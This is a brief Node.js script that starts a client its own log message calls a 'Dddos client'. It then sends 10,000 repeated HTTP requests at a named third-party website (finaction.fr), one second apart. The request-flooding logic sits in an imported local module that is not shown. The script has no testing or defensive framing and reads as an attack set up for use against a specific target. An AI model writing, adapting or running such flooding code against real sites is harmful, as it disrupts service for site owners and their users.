const { Client } = require("./module/index")
const client = new Client({ autoScrapeConfig: { enabled: true, file: "../config.js" } })

client.build().then(c => {
    if (c.isReady) console.log("Dddos client is now ready")
    else console.log("Client can't enter ready")
})

client.createHttpRequest({
    targetUrl: "http://finaction.fr",
    repeat: 10000,
    requestDelay: 1000,
    defaultSettings: true
})